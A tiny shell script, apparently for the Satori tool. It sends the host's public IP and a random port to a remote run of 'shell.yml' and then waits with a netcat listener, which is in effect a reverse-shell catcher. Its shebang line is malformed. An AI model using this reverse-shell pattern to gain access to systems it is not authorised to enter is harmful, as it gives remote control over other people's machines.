!/bin/sh
#trap "" HUP INT
EXTERNAL_IP="`curl -s ifconfig.me`"
RANDOM_PORT=$((1024 + ($(date +%s%N) % 64511)))
satori run shell.yml --data="{\"IP\":\"$EXTERNAL_IP\", \"PORT\":\"$RANDOM_PORT\"}"
nc -vl $RANDOM_PORT
